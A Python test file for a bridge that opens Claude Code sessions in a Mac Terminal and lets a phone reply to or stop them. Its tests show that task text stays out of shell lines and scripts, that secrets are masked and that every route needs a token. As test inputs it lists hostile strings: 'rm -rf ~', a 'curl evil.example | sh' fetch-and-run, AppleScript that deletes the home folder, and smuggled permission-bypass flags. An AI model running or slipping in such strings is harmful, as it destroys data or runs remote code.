"""work_sessions.py and its routes in link_chat.py: the Work tab's Claude Code sessions in ~/Documents/personal/work.

Nothing here opens a terminal or runs claude: osascript, ps and kill are fakes that record what they were given, and
the routes are served by the real Mini App server on a loopback port (test_link_chat.py's harness). What is proved:
a task, however hostile, never reaches a shell line or an AppleScript source, only the argv of claude; the session
runs in exactly the work folder; a reply reaches only that session's tab and is refused when it is not live; stop
signals only that session's process; every route needs the link token and no Origin."""
from __future__ import annotations

import asyncio
import json
import re
import shlex
import signal
import stat
import subprocess
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Optional

import pytest
from test_link_chat import FakeInlet, http, serve, store_at

from eve_bridge import claude_launch, link_chat, work_sessions
from eve_bridge.state import State
from eve_bridge.work_sessions import WorkSessions

HOSTILE = [
    "fix the build\"; rm -rf ~; echo \"",
    "'$(touch /tmp/eve-pwned)' `id` && curl evil.example | sh",
    "\" & (do shell script \"say hacked\") & \"",
    "end tell\ntell application \"Finder\" to delete every item of home\n",
    "-p --print reply with ready",
    "--dangerously-skip-permissions --mcp-config /tmp/x.json",
    "a\\\" ; echo \\\\ ; $HOME ${IFS} %s %n",
]
PYTHON = "/opt/eve/bridge/.venv/bin/python"


class Mac:
    """osascript, ps and kill as the Mac would answer them, recording every call."""

    def __init__(self) -> None:
        self.scripts: list[tuple[str, tuple[str, ...]]] = []
        self.procs: dict[int, str] = {}           # pid -> args, as ps prints them
        self.killed: list[tuple[int, int]] = []
        self.open_answer: tuple[int, str] = (0, "4321 /dev/ttys009")
        self.type_answer: tuple[int, str] = (0, "ok")
        self.dies_on_term = True
        self.ps_fails = False

    async def osascript(self, script: str, *args: str) -> tuple[int, str]:
        self.scripts.append((script, args))
        if script == work_sessions.TERMINAL_OPEN:
            return self.open_answer
        if script == work_sessions.TERMINAL_TYPE:
            return self.type_answer
        raise AssertionError("an unexpected script")

    def run(self, argv: list[str], **kw: Any) -> Any:
        if argv[0] == work_sessions.claude_live.PS:
            if self.ps_fails:
                raise subprocess.TimeoutExpired(argv, 1.5)
            out = "\n".join(f"{pid} {args}" for pid, args in self.procs.items())
            return SimpleNamespace(returncode=0, stdout=out)
        raise AssertionError(f"an unexpected command {argv[0]}")

    def kill(self, pid: int, sig: int) -> None:
        self.killed.append((pid, sig))
        if sig == signal.SIGKILL or self.dies_on_term:
            self.procs.pop(pid, None)

    def claude(self, pid: int, sid: str, task: str = "a task") -> None:
        self.procs[pid] = " ".join(work_sessions.launch_argv(sid, task, Path("/x/m.json"), "/usr/local/bin/claude"))


def make(tmp_path: Path, mac: Optional[Mac] = None, state: Any = None, **kw: Any) -> tuple[WorkSessions, Mac]:
    mac = mac or Mac()
    clock = kw.pop("clock", time.time)

    async def no_sleep(_s: float) -> None:
        await asyncio.sleep(0)

    work = WorkSessions(root=tmp_path / "personal" / "work", home=tmp_path / "home", state=lambda: state,
                        osascript=mac.osascript, run=mac.run, kill=mac.kill, live=lambda: None, clock=clock,
                        python=PYTHON, sleep=no_sleep, environ={}, claude_dir=tmp_path / "claude", **kw)
    return work, mac


def start(work: WorkSessions, task: str, client_id: str = "") -> tuple[int, dict[str, Any]]:
    return asyncio.run(work.start(task, client_id))


# ---- start: the task never reaches a shell or a script ----------------------------------------------------------

@pytest.mark.parametrize("task", HOSTILE)
def test_a_task_is_never_in_a_shell_line_or_a_script_only_claudes_argv(tmp_path: Path, task: str) -> None:
    work, mac = make(tmp_path)
    status, out = start(work, task)
    assert status == 200 and out["ok"] is True
    sid = out["session"]["id"]
    assert re.fullmatch(work_sessions.UUID_RE.pattern[1:-1], sid)
    [(script, args)] = mac.scripts
    assert script == work_sessions.TERMINAL_OPEN                     # a fixed source, the line is its argument
    [line] = args
    root = tmp_path / "personal" / "work"
    assert line == f"cd {shlex.quote(str(root))} && exec {shlex.quote(PYTHON)} -P -m eve_bridge.work_sessions launch {sid}"
    for word in task.split():
        if len(word) > 3:
            assert word not in line, word
    # the task waits in a 0600 file, and only main() reads it, into one argv element after "--"
    task_file = tmp_path / "home" / "work" / f"{sid}.task"
    assert task_file.read_text() == task.strip()
    assert stat.S_IMODE(task_file.stat().st_mode) == 0o600
    assert stat.S_IMODE(task_file.parent.stat().st_mode) == 0o700
    ran: list[tuple[str, list[str]]] = []
    import shutil as _shutil
    old = _shutil.which
    try:
        _shutil.which = lambda name: "/usr/local/bin/claude" if name == "claude" else None   # type: ignore[assignment]
        assert work_sessions.main(["launch", sid], home=tmp_path / "home",
                                  execvp=lambda f, a: ran.append((f, a))) == 0
    finally:
        _shutil.which = old                                         # type: ignore[assignment]
    mcp = tmp_path / "home" / "work" / f"{sid}.mcp.json"
    assert ran == [("/usr/local/bin/claude", ["/usr/local/bin/claude", "--dangerously-skip-permissions",
                                              "--mcp-config", str(mcp), "--session-id", sid, "--", task.strip()])]
    assert not task_file.exists()                                  # read once, then gone


def test_the_session_runs_in_personal_work_never_the_work_area(tmp_path: Path,
                                                               monkeypatch: pytest.MonkeyPatch) -> None:
    home = Path.home()
    assert work_sessions.work_root({}) == home / "Documents" / "personal" / "work"
    assert work_sessions.work_root({}) != claude_launch.code_root({}) / "work"
    assert work_sessions.work_root({"EVE_WORK_ROOT": str(tmp_path)}) == tmp_path
    work, mac = make(tmp_path)
    start(work, "hello")
    line = mac.scripts[0][1][0]
    assert line.startswith(f"cd {shlex.quote(str(tmp_path / 'personal' / 'work'))} && ")
    assert "era-code" not in line and "claude" not in line.split("&&")[0]
    assert (tmp_path / "personal" / "work").is_dir()


def test_eves_mcp_config_is_private_and_holds_only_a_token_hash_in_the_registry(tmp_path: Path) -> None:
    work, _ = make(tmp_path)
    sid = start(work, "hello")[1]["session"]["id"]
    mcp = tmp_path / "home" / "work" / f"{sid}.mcp.json"
    assert stat.S_IMODE(mcp.stat().st_mode) == 0o600
    server = json.loads(mcp.read_text())["mcpServers"]["eve"]
    assert server["command"] == PYTHON and server["args"] == ["-P", "-m", "eve_bridge.eve_mcp"]
    token = server["env"]["EVE_MCP_TOKEN"]
    assert server["env"]["EVE_MCP_SESSION"] == sid and len(token) >= 40
    registry = (tmp_path / "home" / work_sessions.REGISTRY_NAME).read_text()
    assert token not in registry and sid in registry
    assert stat.S_IMODE((tmp_path / "home" / work_sessions.REGISTRY_NAME).stat().st_mode) == 0o600
    assert work.check_token(sid, token) and not work.check_token(sid, token[:-1])
    assert not work.check_token("nope", token) and not work.check_token(sid, None)
    again = WorkSessions(root=tmp_path / "w", home=tmp_path / "home", osascript=_never, environ={})
    assert again.check_token(sid, token)                            # the registry survives a restart


async def _never(*_a: Any) -> tuple[int, str]:
    raise AssertionError("no terminal")


def test_the_same_client_id_is_one_session_and_one_terminal(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    a = start(work, "hello", "c-1")[1]["session"]["id"]
    b = start(work, "hello again", "c-1")[1]["session"]["id"]
    c = start(work, "hello", "c-2")[1]["session"]["id"]
    assert a == b != c
    assert len(mac.scripts) == 2


@pytest.mark.parametrize("task,client_id", [("", ""), ("   ", ""), (None, ""), (42, ""), ("x" * 4001, ""),
                                            ("ok", "c" * 65), ("ok", 7)])
def test_a_bad_start_is_a_400_and_opens_nothing(tmp_path: Path, task: Any, client_id: Any) -> None:
    work, mac = make(tmp_path)
    status, out = start(work, task, client_id)
    assert status == 400 and out["ok"] is False and mac.scripts == []


def test_terminal_failing_is_a_503_and_leaves_nothing_behind(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    mac.open_answer = (1, "Not authorized to send Apple events to Terminal.")
    status, out = start(work, "hello")
    assert status == 503 and out == {"ok": False, "reason": "eve couldn't open Terminal on the Mac"}
    assert work.records == {}
    assert list((tmp_path / "home" / "work").iterdir()) == []


def test_a_window_whose_id_terminal_did_not_give_runs_but_takes_no_reply(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    mac.open_answer = (0, "0 ")
    status, out = start(work, "hello")
    assert status == 200 and out["session"]["can_reply"] is False
    sid = out["session"]["id"]
    mac.claude(8, sid)
    typed = len(mac.scripts)
    assert asyncio.run(work.reply(sid, "hi")) == (409, {"ok": False, "reason": work_sessions.NO_WINDOW})
    assert len(mac.scripts) == typed                                  # nothing typed anywhere


def test_session_end_is_not_the_end_while_the_process_runs(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(8, sid)
    work.note("session_end", {"session_id": sid})                     # a /clear
    now["t"] += work_sessions.GRACE_SECS + 1
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid]
    assert asyncio.run(work.reply(sid, "hi"))[0] == 200


# ---- the list ----------------------------------------------------------------------------------------------------

def test_states_follow_the_hooks_and_the_list_has_every_live_session(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    sid = start(work, "Port the parser to Rust\nand keep the tests")[1]["session"]["id"]
    mac.claude(501, sid)
    rows = asyncio.run(work.list())[1]["sessions"]
    assert [(r["id"], r["state"], r["title"], r["folder"]) for r in rows] == [
        (sid, "starting", "Port the parser to Rust", "work")]
    for evt, req, want in (("session_start", {}, "idle"), ("turn_begin", {}, "working"),
                           ("notification", {"notification_type": "idle_prompt"}, "working"),
                           ("pretooluse", {"tool_name": "AskUserQuestion"}, "waiting"),
                           ("posttooluse", {}, "working"),
                           ("notification", {"notification_type": "permission_prompt"}, "waiting"),
                           ("turn_begin", {}, "working"), ("turn_end", {}, "idle")):
        work.note(evt, {"session_id": sid, **req})
        assert asyncio.run(work.list())[1]["sessions"][0]["state"] == want, evt
    # another session the hooks told the daemon about: listed, read-only
    state.session_start("11111111-2222-4333-8444-555555555555", cwd=str(tmp_path / "eve"))
    state.turn_begin("11111111-2222-4333-8444-555555555555")
    out = asyncio.run(work.list())[1]
    other = next(r for r in out["sessions"] if not r["from_work"])
    assert other["folder"] == "eve" and other["state"] == "working" and not other["can_reply"] and not other["can_stop"]
    mine = next(r for r in out["sessions"] if r["from_work"])
    assert mine["can_reply"] and mine["can_stop"]
    assert set(mine) == {"id", "folder", "title", "state", "last_activity", "last_line", "from_work", "can_reply",
                         "can_stop", "can_continue"}
    assert mine["can_continue"] is False and other["can_continue"] is False      # no transcript for it yet
    assert all("/" not in r["folder"] for r in out["sessions"])     # basenames only
    assert out["folder"] == "work"


def test_a_session_whose_process_is_gone_leaves_the_list(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid]     # within its grace
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.list())[1]["sessions"] == []
    assert work.records[sid].over
    mac.ps_fails = True                                             # a blind probe keeps what it cannot judge
    sid2 = start(work, "again")[1]["session"]["id"]
    now["t"] += work_sessions.GRACE_SECS + 1
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid2]


# ---- detail ------------------------------------------------------------------------------------------------------

def transcript(path: Path, rows: list[dict[str, Any]]) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    return path


def line(kind: str, content: Any, **kw: Any) -> dict[str, Any]:
    return {"type": kind, "timestamp": "2026-10-12T10:00:00.000Z",
            "message": {"role": "user" if kind == "user" else "assistant", "content": content}, **kw}


def test_detail_is_the_latest_turns_only_words_clipped_and_without_secrets(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(77, sid)
    path = transcript(tmp_path / "t" / f"{sid}.jsonl", [
        line("user", "Find the flaky test"),
        line("user", "<command-name>/clear</command-name>"),
        line("user", "Caveat: meta", isMeta=True),
        line("assistant", [{"type": "thinking", "thinking": "private thoughts"},
                           {"type": "text", "text": "Looking now."},
                           {"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "cat .env"}}]),
        line("user", [{"type": "tool_result", "tool_use_id": "t1", "content": "OPENROUTER_API_KEY=abc123"}]),
        line("assistant", [{"type": "text", "text": "Subagent says hi"}], isSidechain=True),
        line("assistant", [{"type": "text", "text": "Found it. Key sk-or-v1-" + "a" * 40 + " and API_TOKEN=hunter2 "
                                                    "and ghp_" + "b" * 36 + " " + "y" * 3000}]),
    ])
    work.note("session_start", {"session_id": sid, "transcript_path": str(path)})
    status, out = asyncio.run(work.detail(sid))
    assert status == 200
    assert [(t["role"], t["text"][:20]) for t in out["turns"]] == [
        ("owner", "Find the flaky test"), ("claude", "Looking now."), ("claude", "Found it. Key [hidde")]
    last = out["turns"][-1]["text"]
    assert len(last) <= work_sessions.TURN_CHARS and last.endswith("…")
    for secret in ("sk-or-v1-", "hunter2", "ghp_", "abc123", "private thoughts", "cat .env", "Subagent"):
        assert secret not in json.dumps(out), secret
    assert out["turns"][0]["at"] > 0 and out["cut"] is False
    assert out["session"]["id"] == sid and out["session"]["last_line"].startswith("Found it.")
    assert asyncio.run(work.detail("99999999-2222-4333-8444-555555555555"))[0] == 404


def test_detail_ends_a_session_whose_claude_exited_and_says_ended(tmp_path: Path) -> None:
    """/exit or a crash while the sheet is open (the list is not polled then): detail itself notices after the
    grace, ends the record and answers state "ended"; within the grace it is "starting"."""
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    status, out = asyncio.run(work.detail(sid))
    assert status == 200 and out["session"]["state"] == "starting" and out["ended"] is False   # within its grace
    mac.claude(9, sid)
    work.note("session_start", {"session_id": sid})
    now["t"] += work_sessions.GRACE_SECS + 1
    out = asyncio.run(work.detail(sid))[1]
    assert out["session"]["state"] == "idle" and out["session"]["can_reply"] and out["ended"] is False
    del mac.procs[9]                                                 # the owner typed /exit
    out = asyncio.run(work.detail(sid))[1]
    assert out["ended"] is True and out["session"]["state"] == "ended"
    assert out["session"]["can_reply"] is False and out["session"]["can_stop"] is False
    assert work.records[sid].over
    mac.ps_fails = True                                              # a blind probe never ends a session
    sid2 = start(work, "again")[1]["session"]["id"]
    now["t"] += work_sessions.GRACE_SECS + 1
    out = asyncio.run(work.detail(sid2))[1]
    assert out["ended"] is False and not work.records[sid2].over
    # a stopped session reads as ended too
    mac.ps_fails = False
    assert asyncio.run(work.stop(sid2))[0] == 200
    out = asyncio.run(work.detail(sid2))[1]
    assert out["ended"] is True and out["session"]["state"] == "ended"


def test_a_session_past_its_grace_without_a_process_is_never_starting(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, _ = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    rec = work.records[sid]
    rec.phase = "working"
    assert work._row(rec, {}, None, "")["state"] == "starting"
    now["t"] += work_sessions.GRACE_SECS + 1
    assert work._row(rec, {}, None, "")["state"] == "working"
    assert work._row(rec, {}, None, "")["can_reply"] is False


def test_the_mcp_server_never_has_the_work_folder_on_sys_path() -> None:
    got = work_sessions.mcp_config("11111111-2222-4333-8444-555555555555", "tok", PYTHON, {})
    assert got["mcpServers"]["eve"]["args"] == ["-P", "-m", "eve_bridge.eve_mcp"]


def test_minus_p_keeps_a_planted_stdlib_name_in_the_work_folder_from_loading(tmp_path: Path) -> None:
    import sys as _sys
    (tmp_path / "uuid.py").write_text("raise SystemExit('planted uuid.py ran')\n")
    planted = subprocess.run([_sys.executable, "-m", "uuid"], cwd=tmp_path, capture_output=True, text=True)
    assert "planted uuid.py ran" in planted.stderr                   # without -P the folder's file wins
    guarded = subprocess.run([_sys.executable, "-P", "-m", "uuid"], cwd=tmp_path, capture_output=True, text=True)
    assert "planted" not in guarded.stderr and guarded.returncode == 0


def test_detail_keeps_the_last_twenty_turns_of_a_long_transcript(tmp_path: Path) -> None:
    path = transcript(tmp_path / "t.jsonl", [line("user" if i % 2 else "assistant",
                                                  f"turn {i}" if i % 2 else [{"type": "text", "text": f"turn {i}"}])
                                             for i in range(60)])
    turns, cut = work_sessions.transcript_turns(path)
    assert [t["text"] for t in turns] == [f"turn {i}" for i in range(40, 60)] and cut is True
    turns, cut = work_sessions.transcript_turns(path, tail=200)    # a tail that starts mid-line
    assert cut is True and all(t["text"].startswith("turn ") for t in turns)


def test_a_transcript_path_is_derived_when_no_hook_gave_one(tmp_path: Path) -> None:
    got = work_sessions.derived_transcript(Path("/home/someone/Documents/personal/work"), "abc",
                                           tmp_path / ".claude")
    assert got == tmp_path / ".claude" / "projects" / "-home-someone-Documents-personal-work" / "abc.jsonl"


# ---- reply: only that session, only while it is live ----------------------------------------------------------

def test_a_reply_types_into_that_sessions_tab_only_as_an_argument(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(42, sid)
    text = 'yes, and then "quote" $(rm -rf ~) \n second line'
    assert asyncio.run(work.reply(sid, text)) == (200, {"ok": True})
    script, args = mac.scripts[-1]
    assert script == work_sessions.TERMINAL_TYPE
    assert args == ("4321", "/dev/ttys009", 'yes, and then "quote" $(rm -rf ~) second line')   # one line
    assert "rm -rf" not in script and "quote" not in script


def test_a_reply_is_refused_when_the_session_is_not_live_or_not_ours(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    state = State()
    work, mac = make(tmp_path, state=state, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    typed = len(mac.scripts)
    assert asyncio.run(work.reply(sid, "hi"))[0] == 409               # still starting: claude is not up
    now["t"] += work_sessions.GRACE_SECS + 1
    ended = (409, {"ok": False, "reason": work_sessions.ENDED, "code": work_sessions.ENDED_CODE})
    assert asyncio.run(work.reply(sid, "hi")) == ended
    assert asyncio.run(work.reply(sid, "hi")) == ended
    sid2 = start(work, "again")[1]["session"]["id"]
    mac.claude(43, sid2)
    typed = len(mac.scripts)
    mac.ps_fails = True                                              # cannot tell: never type
    assert asyncio.run(work.reply(sid2, "hi")) == (409, {"ok": False, "reason": work_sessions.NO_WINDOW})
    mac.ps_fails = False
    mac.type_answer = (0, "idle")                                    # a shell holds the tab: never type into it
    assert asyncio.run(work.reply(sid2, "hi")) == (409, {"ok": False, "reason": work_sessions.NO_WINDOW})
    mac.type_answer = (0, "gone")
    assert asyncio.run(work.reply(sid2, "hi"))[0] == 409
    assert len(mac.scripts) == typed + 2                              # only the two the probe allowed were tried
    state.session_start("11111111-2222-4333-8444-555555555555", cwd=str(tmp_path / "eve"))
    assert asyncio.run(work.reply("11111111-2222-4333-8444-555555555555", "hi")) == (
        409, {"ok": False, "reason": work_sessions.NOT_OURS})
    assert asyncio.run(work.reply("99999999-2222-4333-8444-555555555555", "hi"))[0] == 404
    mac.type_answer = (0, "ok")
    assert asyncio.run(work.reply(sid2, "  "))[0] == 400
    assert asyncio.run(work.reply(sid2, "x" * 4001))[0] == 400
    assert asyncio.run(work.reply(sid2, "fine"))[0] == 200          # positive control


# ---- stop ----------------------------------------------------------------------------------------------------

def test_stop_signals_only_that_sessions_process_and_is_idempotent(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    a = start(work, "one")[1]["session"]["id"]
    b = start(work, "two")[1]["session"]["id"]
    mac.claude(100, a)
    mac.claude(200, b)
    mac.procs[300] = "/usr/local/bin/claude --dangerously-skip-permissions"          # the owner's own session
    state.session_start(a, cwd=str(work.root))
    assert asyncio.run(work.stop(a)) == (200, {"ok": True, "stopped": True})
    assert mac.killed == [(100, signal.SIGTERM)]
    assert work.records[a].stopped and a not in state.sessions
    assert not (tmp_path / "home" / "work" / f"{a}.mcp.json").exists()
    assert not work.check_token(a, "anything")
    assert asyncio.run(work.stop(a)) == (200, {"ok": True, "stopped": True})          # again: still fine
    assert mac.killed == [(100, signal.SIGTERM)]
    assert 200 in mac.procs and 300 in mac.procs
    assert asyncio.run(work.reply(a, "hi"))[0] == 409


def test_a_session_that_ignores_sigterm_gets_sigkill(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    sid = start(work, "one")[1]["session"]["id"]
    mac.claude(100, sid)
    mac.dies_on_term = False
    assert asyncio.run(work.stop(sid))[0] == 200
    assert mac.killed == [(100, signal.SIGTERM), (100, signal.SIGKILL)]


def test_ps_finds_session_ids_only_before_the_task(tmp_path: Path) -> None:
    sid = "0f0e0d0c-0b0a-4908-8706-050403020100"
    other = "11111111-2222-4333-8444-555555555555"
    mac = Mac()
    mac.claude(5, sid, task=f"--session-id {other}")             # a task that names another id
    mac.procs[6] = f"node /opt/homebrew/bin/claude --session-id={other}"
    mac.procs[7] = f"vim --session-id {sid}"                    # not claude
    assert work_sessions.session_pids(mac.run) == {sid: 5, other: 6}


def test_secrets_are_masked() -> None:
    text = ("token sk-proj-" + "x" * 30 + " GITHUB_TOKEN='abc' password: hunter2 Bearer " + "q" * 30
            + " key AKIAABCDEFGHIJKLMNOP and " + "a1" * 25)
    out = work_sessions.redact(text)
    for bad in ("sk-proj-", "abc'", "hunter2", "q" * 30, "AKIAABCD", "a1" * 25):
        assert bad not in out, bad
    assert work_sessions.redact("plain words, a path /tmp/x and the number 12345") == \
        "plain words, a path /tmp/x and the number 12345"


# ---- the routes ----------------------------------------------------------------------------------------------

SID = "0f0e0d0c-0b0a-4908-8706-050403020100"


def test_every_session_route_needs_the_link_token_and_no_origin(tmp_path: Path) -> None:
    work, mac = make(tmp_path)

    async def go() -> None:
        server, port, token = await serve(tmp_path, FakeInlet(store_at(tmp_path)), work=lambda: work)
        doors = (("GET", link_chat.SESSIONS_PATH, None), ("POST", link_chat.SESSION_START_PATH, {"task": "hi"}),
                 ("GET", f"{link_chat.SESSIONS_PATH}/{SID}", None),
                 ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/reply", {"text": "hi"}),
                 ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/stop", None),
                 ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/continue", {"text": "hi"}))
        for method, path, body in doors:
            assert (await http(port, method, path, body))[0] == 401, path
            assert (await http(port, method, path, body, token=token[:-1]))[0] == 401, path
            assert (await http(port, method, path, body, token=token, origin="https://evil.example"))[0] == 403, path
            assert (await http(port, method, path, body, token=token, origin="null"))[0] == 403, path
        assert mac.scripts == [] and work.records == {}                   # nothing was started
        status, _, raw = await http(port, "POST", link_chat.SESSION_START_PATH, {"task": "hi", "client_id": "a"},
                                    token=token)                          # positive control
        assert status == 200 and json.loads(raw)["session"]["state"] == "starting"
        await server.close()

    asyncio.run(go())


def test_the_routes_shapes_wrong_methods_and_unknown_paths(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)

    async def go() -> None:
        server, port, token = await serve(tmp_path, FakeInlet(store_at(tmp_path)), work=lambda: work)
        status, headers, raw = await http(port, "POST", link_chat.SESSION_START_PATH,
                                          {"task": "Tidy the notes", "client_id": "c1"}, token=token)
        assert status == 200 and headers["content-type"] == "application/json"
        sid = json.loads(raw)["session"]["id"]
        mac.claude(9, sid)
        listed = json.loads((await http(port, "GET", link_chat.SESSIONS_PATH, token=token))[2])
        assert listed["ok"] is True and [s["id"] for s in listed["sessions"]] == [sid]
        detail = json.loads((await http(port, "GET", f"{link_chat.SESSIONS_PATH}/{sid}", token=token))[2])
        assert detail["ok"] is True and detail["turns"] == [] and detail["session"]["id"] == sid
        assert (await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{sid}/reply", {"text": "go on"},
                           token=token))[0] == 200
        assert mac.scripts[-1][1][2] == "go on"
        assert (await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{sid}/stop", token=token))[0] == 200
        assert mac.killed == [(9, signal.SIGTERM)]
        assert (await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{sid}/reply", {"text": "more"},
                           token=token))[0] == 409
        for method, path in (("POST", link_chat.SESSIONS_PATH), ("GET", link_chat.SESSION_START_PATH),
                             ("POST", f"{link_chat.SESSIONS_PATH}/{sid}"),
                             ("GET", f"{link_chat.SESSIONS_PATH}/{sid}/reply"),
                             ("GET", f"{link_chat.SESSIONS_PATH}/{sid}/stop")):
            assert (await http(port, method, path, {} if method == "POST" else None, token=token))[0] == 405, path
        for path in (f"{link_chat.SESSIONS_PATH}/not-a-uuid", f"{link_chat.SESSIONS_PATH}/{sid}/kill",
                     f"{link_chat.SESSIONS_PATH}/{sid.upper()}", f"{link_chat.SESSIONS_PATH}/../../etc"):
            assert (await http(port, "GET", path, token=token))[0] == 404, path
        assert (await http(port, "POST", link_chat.SESSION_START_PATH, b"[1, 2]", token=token))[0] == 400
        assert (await http(port, "POST", link_chat.SESSION_START_PATH, {"task": ""}, token=token))[0] == 400
        await server.close()

    asyncio.run(go())


def test_work_off_is_a_503_on_every_route(tmp_path: Path) -> None:
    async def go() -> None:
        for work in (None, lambda: None):
            kw = {} if work is None else {"work": work}
            server, port, token = await serve(tmp_path / str(id(work)), FakeInlet(store_at(tmp_path)), **kw)
            for method, path, body in (("GET", link_chat.SESSIONS_PATH, None),
                                       ("POST", link_chat.SESSION_START_PATH, {"task": "hi"}),
                                       ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/reply", {"text": "x"})):
                status, _, raw = await http(port, method, path, body, token=token)
                assert status == 503 and json.loads(raw) == {"ok": False, "error": link_chat.NO_WORK}
            await server.close()

    asyncio.run(go())


def test_the_switch() -> None:
    assert work_sessions.enabled({}) and work_sessions.enabled({"EVE_WORK_SESSIONS": "1"})
    for off in ("0", "off", "false", "no"):
        assert not work_sessions.enabled({"EVE_WORK_SESSIONS": off})


# ---- sessions eve did not start: their turns, and continuing them from the phone --------------------------------

OTHER = "11111111-2222-4333-8444-555555555555"


def trust(tmp_path: Path, *folders: Path) -> None:
    state = tmp_path / "claude" / ".claude.json"
    state.parent.mkdir(parents=True, exist_ok=True)
    got = json.loads(state.read_text()) if state.exists() else {"projects": {}}
    for f in folders:
        got["projects"][str(f)] = {"hasTrustDialogAccepted": True}
    state.write_text(json.dumps(got))


def adopted(tmp_path: Path, state: State, folder: str = "eve") -> tuple[Path, Path]:
    """A session the daemon adopted from a tool hook after a restart: a cwd, no transcript_path. Its transcript is
    where Claude Code writes it. Claude has been trusted in the folder above it."""
    cwd = tmp_path / "code" / folder
    cwd.mkdir(parents=True, exist_ok=True)
    trust(tmp_path, tmp_path / "code")
    state.session_start(OTHER, cwd=str(cwd))
    path = transcript(work_sessions.derived_transcript(cwd, OTHER, tmp_path / "claude"), [
        line("user", "Make the hooks fast"), line("assistant", [{"type": "text", "text": "Ported them to Rust."}])])
    return cwd, path


def test_an_adopted_session_without_a_transcript_path_shows_its_turns(tmp_path: Path) -> None:
    state = State()
    work, _ = make(tmp_path, state=state)
    _, path = adopted(tmp_path, state)
    assert state.sessions[OTHER].transcript_path is None
    status, out = asyncio.run(work.detail(OTHER))
    assert status == 200
    assert [(t["role"], t["text"]) for t in out["turns"]] == [("owner", "Make the hooks fast"),
                                                               ("claude", "Ported them to Rust.")]
    assert out["session"]["can_continue"] is True and out["session"]["can_reply"] is False
    row = next(r for r in asyncio.run(work.list())[1]["sessions"] if r["id"] == OTHER)
    assert row["last_line"] == "Ported them to Rust." and row["can_continue"] is True
    # a cwd that does not map to the transcript's folder (a symlink, a renamed folder): found by id in any project
    moved = tmp_path / "claude" / "projects" / "-somewhere-else" / f"{OTHER}.jsonl"
    moved.parent.mkdir(parents=True)
    path.rename(moved)
    assert len(asyncio.run(work.detail(OTHER))[1]["turns"]) == 2
    assert work_sessions.found_transcript(None, "../../etc/passwd", tmp_path / "claude") is None


def test_the_derived_path_turns_every_non_alphanumeric_into_a_dash(tmp_path: Path) -> None:
    got = work_sessions.derived_transcript(Path("/tmp/claude-501/my_proj v2"), "abc", tmp_path)
    assert got == tmp_path / "projects" / "-tmp-claude-501-my-proj-v2" / "abc.jsonl"


def launched(tmp_path: Path, sid: str) -> list[str]:
    ran: list[tuple[str, list[str]]] = []
    import shutil as _shutil
    old = _shutil.which
    try:
        _shutil.which = lambda name: "/usr/local/bin/claude" if name == "claude" else None   # type: ignore[assignment]
        assert work_sessions.main(["launch", sid], home=tmp_path / "home",
                                  execvp=lambda f, a: ran.append((f, a))) == 0
    finally:
        _shutil.which = old                                         # type: ignore[assignment]
    [(_, argv)] = ran
    return argv


@pytest.mark.parametrize("text", HOSTILE[:3])
def test_continue_forks_a_session_eve_did_not_start_in_its_own_folder(tmp_path: Path, text: str) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    cwd, path = adopted(tmp_path, state)
    before = path.read_text()
    status, out = asyncio.run(work.continue_session(OTHER, text, "c-1"))
    assert status == 200 and out["ok"] is True
    new = out["session"]["id"]
    assert new != OTHER and out["session"]["from_work"] is True and out["session"]["folder"] == "eve"
    assert out["session"]["title"] == "eve"
    [(script, (cmd,))] = mac.scripts
    assert script == work_sessions.TERMINAL_OPEN
    assert cmd == f"cd {shlex.quote(str(cwd))} && exec {shlex.quote(PYTHON)} -P -m eve_bridge.work_sessions launch {new}"
    resume = tmp_path / "home" / "work" / f"{new}.resume"
    assert resume.read_text() == OTHER and stat.S_IMODE(resume.stat().st_mode) == 0o600
    argv = launched(tmp_path, new)
    mcp = tmp_path / "home" / "work" / f"{new}.mcp.json"
    assert argv == ["/usr/local/bin/claude", "--dangerously-skip-permissions", "--mcp-config", str(mcp),
                    "--resume", OTHER, "--fork-session", "--session-id", new, "--", text.strip()]
    assert not resume.exists()                                      # read once, then gone
    # ps names the fork by its own id, never the original's, so reply and stop reach only the fork
    mac.procs[70] = " ".join(argv)
    assert work_sessions.session_pids(mac.run) == {new: 70}
    assert asyncio.run(work.reply(new, "and the tests"))[0] == 200
    assert asyncio.run(work.continue_session(OTHER, text, "c-1"))[1]["session"]["id"] == new   # a retry: same one
